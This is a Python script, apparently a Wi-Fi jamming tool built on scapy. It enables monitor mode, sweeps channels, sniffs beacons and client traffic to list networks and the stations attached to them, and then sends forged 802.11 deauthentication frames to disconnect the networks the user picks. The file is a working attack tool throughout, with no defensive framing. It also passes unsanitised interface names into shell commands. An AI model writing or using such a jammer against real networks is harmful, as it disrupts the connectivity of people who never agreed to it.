#! /usr/bin/env python3

from scapy.all import *
from threading import Thread, currentThread
import time
import os
import sys
import glob

def check_perm():
    if os.geteuid() != 0:
        print("You should run this program as root")
        sys.exit(1)

def get_own_mac() -> list:
    mac_loc = glob.glob('/sys/class/net/**/address')
    global unique
    for mac_file in mac_loc:
        with open(mac_file) as f:
            unique.append(f.readline().replace('\n', ''))


networks = dict()
clients = []
unique = []

class Client:

    def __init__(self, ap, addr):
        self.ap = ap
        self.addr = addr

class Network:

    def __init__(self, bssid, essid, channel):
        self.bssid = bssid
        self.essid = essid
        self.channel = channel
    
    def get_client_list(self, clients) -> list:
        client_list = []
        for couple in clients:
            if self.bssid == couple[0]:
                client_list.append(Client(self.bssid, couple[1]))
            elif self.bssid == couple[1]:
                client_list.append(Client(self.bssid, couple[0]))
        return client_list

def monitor(mode, iface):
    if mode == 'on':
        os.system('ip l set ' + iface + ' down')
        os.system('iw dev ' + iface + ' set monitor none')
        os.system('ip l set ' + iface + ' up')
        print('Monitor mode enabled on ' +iface)
    if mode == 'off':
        os.system('ip l set ' + iface + ' down')
        os.system('iw dev ' + iface + ' set type managed')
        os.system('ip l set ' + iface + ' up')
        print('Monitor mode disabled on ' +iface)

def sniff_clients(iface) :
    global clients

    sniff(prn=callback_client, iface=iface, timeout=20)

def get_client() -> list:
    global clients
    return clients

def get_chan_list(ap_list:list) -> list:
    chan_list = []
    for ap in ap_list:
        chan_list.append(ap.channel)
    return chan_list

def get_networks(iface) -> list:
    global networks
    net_list = []
    channel_sweeper = Thread(target=channel_sweep, kwargs=dict(iface=iface))
    channel_sweeper.start()
    sniff(prn=callback_ap, iface=iface, timeout=25)
    channel_sweeper.stop = False
    channel_sweeper.join(timeout=1)

    for ssid in networks:
        params = {'bssid': networks[ssid]['bssid'], 'essid': ssid, 'channel': networks[ssid]['channel']}
        net_list.append(Network(**params))
    return net_list

def callback_client(pkt) :
    global unique
    global clients
    try:
        if pkt.subtype == 0 or pkt.subtype == 8 :
            if pkt.addr1 != 'ff:ff:ff:ff:ff:ff' :
                if pkt.addr1 not in unique or pkt.addr2 not in unique:
                    clients.append([pkt.addr1, pkt.addr2])
                if pkt.addr1 not in unique:
                    unique.append(pkt.addr1)
                if pkt.addr2 not in unique:
                    unique.append(pkt.addr2)
    except:
        pass

def callback_ap(pkt) :
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11].info.decode()
        stats = pkt[Dot11Beacon].network_stats()
        channel = stats.get('channel')
        if ssid not in networks:
            print(ssid)
            networks[ssid] = {'bssid': bssid, 'channel': channel}

def set_channel(ch, iface):
    os.system(f"iwconfig {iface} channel {ch}")

def channel_sweep(iface, chan_list=None):
    t = currentThread()
    t.stop = True
    if chan_list is None:
        ch = 1
        while getattr(t, 'stop', True):
            set_channel(ch, iface=iface)
            # switch channel from 1 to 13 each 0.5s
            ch = ch % 13 + 1
            time.sleep(0.5)
    else:
        while getattr(t, 'stop', True):
            for ch in chan_list:
                set_channel(ch, iface=iface)
                time.sleep(0.5)

def choose_from_networks(networks:list) -> list:
    selection = []
    for i in range(len(networks)):
        print('{} - {}'.format(i, networks[i].essid))

    choice = input('Which network would you like to jam ? \nYou can specify multiple networks by separating their index by an empty space \n> ')

    for i in choice.split(' '):
        selection.append(networks[int(i)])
    return selection

def jam_network(target_list:list, iface, loop:int):
    packets = []
    for target in target_list:
        deauth_packet = RadioTap()/Dot11(addr1=target.addr, addr2=target.ap, addr3=target.ap)/Dot11Deauth()
        packets.append(deauth_packet)
        for i in range(loop):
            for packet in packets:
                try:
                    sendp(packet, iface=iface)
                    time.sleep(1)
                except KeyboardInterrupt:
                    return 1
    return 0
